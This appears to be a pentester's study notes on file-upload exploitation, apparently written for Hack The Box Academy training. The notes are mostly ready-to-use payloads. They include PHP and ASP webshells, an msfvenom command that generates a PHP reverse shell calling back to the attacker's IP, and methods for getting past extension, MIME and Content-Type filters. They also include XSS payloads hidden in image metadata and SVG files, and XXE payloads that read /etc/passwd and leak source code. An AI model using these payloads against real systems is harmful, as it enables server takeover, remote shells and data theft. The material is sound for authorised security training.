# Notes

## Webshells
We can download a php webshell here:
```
https://github.com/Arrexel/phpbash
```

Or write a basic webshell ourselves:
```php
<?php system($_REQUEST['cmd']); ?>
```

A basic .NET webshell
```
<% eval request('cmd') %>
```

## Reverse shells

We can get reverse shells here for php: https://github.com/pentestmonkey/php-reverse-shell
We can generate rev shells also with `msfvenom`:
```
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

## Blacklists 

Lots of times `.php` is blacklisted however there are many extensions which will run just fine ... 
We can test extensions to see if they are blacklisted using this list:
```
/snap/seclists/current/Discovery/Web-Content/web-extensions.txt
```
or specific ones for php found here:
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
```

## Whitelist filter

Typically the filename needs to include a certain type of file extension.
We can try to get arround it by using double extensions... `file.php.jpg` and check if it uploads and runs.

Character injection also sometimes helps, see: https://academy.hackthebox.com/module/136/section/1289#:~:text=The%20following%20are%20some%20of%20the%20characters%20we%20may%20try%20injecting%3A

## Content-Type headers

Sometimes the webservers check the `Content-Type` header on uploads so make sure it matches the expected file type

## MIME type

Prefix the first few bytes of the file with the MIME-type if the required file.

## XSS

We can embed XSS payloads into images... 
```
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
see https://academy.hackthebox.com/module/136/section/1291#:~:text=Another%20example%20of%20XSS%20attacks%20is%20web%20applications%20that%20display%20an%20image%27s%20metadata%20after%20its%20upload.%20For%20such%20web%20applications%2C%20we%20can%20include%20an%20XSS%20payload%20in%20one%20of%20the%20Metadata%20parameters%20that%20accept%20raw%20text%2C%20like%20the%20Comment%20or%20Artist%20parameters%2C%20as%20follows%3A

We can also embed code in picutes of type `SVG`:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE

We can use an SVG image to leak internal files:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Leak source code like this:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```